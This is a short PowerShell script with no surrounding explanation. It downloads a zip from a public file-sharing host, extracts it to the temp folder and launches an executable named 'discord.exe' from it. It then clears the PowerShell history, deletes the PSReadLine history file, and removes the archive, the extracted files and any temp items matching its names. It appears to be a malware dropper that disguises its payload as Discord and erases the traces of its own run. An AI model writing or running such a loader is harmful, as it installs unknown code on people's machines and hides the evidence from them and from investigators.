$zipUrl = "https://files.catbox.moe/0tjan7.zip"

$zipPath = "$env:TEMP\work.zip"
$extractPath = "$env:TEMP\work"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath

if (Test-Path $extractPath) {
    Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue
}

Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force

$exe = Get-ChildItem $extractPath -Recurse -Filter "discord.exe" | Select-Object -First 1

if ($exe) {
    Start-Process $exe.FullName
}

Start-Sleep 3

Clear-History

Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue

Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue

Remove-Item "$env:USERPROFILE\Downloads\work.zip" -Force -ErrorAction SilentlyContinue

Get-ChildItem "$env:TEMP" -Recurse -ErrorAction SilentlyContinue |
Where-Object {
    $_.Name -match "work|discord|0tjan7"
} |
Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
